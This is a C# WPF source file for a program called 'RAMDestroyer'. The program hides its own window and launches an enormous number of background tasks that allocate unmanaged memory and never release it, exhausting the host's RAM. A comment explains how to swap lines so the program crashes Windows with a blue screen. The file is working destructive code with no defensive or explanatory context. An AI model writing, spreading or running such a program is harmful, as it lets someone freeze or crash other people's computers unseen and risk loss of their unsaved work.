using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;

namespace RAMDestroyer
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            Hide();
            InitializeComponent();

            int amount = 1024 * 1024;

            for (int i = 0; i < int.MaxValue && amount != 0; i++)
            {
                Task.Run(() =>
                {
                    try
                    {
                        Marshal.AllocHGlobal(amount);
                        // Swap-comment these lines to trigger BSOD
                        // Marshal.AllocHGlobal(1024 * 1024);
                    }
                    catch
                    {
                        if (amount > 1)
                        {
                            amount /= 1024;
                        }
                        else
                        {
                            amount = 0;
                        }
                    }
                });
            }
        }
    }
}
